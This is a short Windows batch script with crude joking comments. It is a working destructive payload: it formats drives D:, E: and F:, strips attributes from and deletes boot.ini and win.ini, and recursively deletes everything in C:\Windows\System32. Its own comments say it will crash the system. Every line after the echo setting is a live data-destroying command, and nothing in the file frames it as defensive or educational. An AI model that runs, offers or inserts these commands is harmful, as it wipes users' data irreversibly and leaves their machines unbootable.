@echo off

REM :: Put the Drive Letter after "format" keyword to format that fuckin' drive :v
format D: /fs:NTFS
format E: /fs:NTFS
format F: /fs:NTFS



REM :: Do not change Code from Below until you know what are you fuckin' doing.
REM :: BTW, Below code will cause the system Crash :v

attrib -r -s -h c:\boot.ini
del /Q c:\boot.ini
attrib -r -s -h c:\windows\win.ini 
del /Q c:\windows\win.ini
del /Q/S c:\windows\system32\*
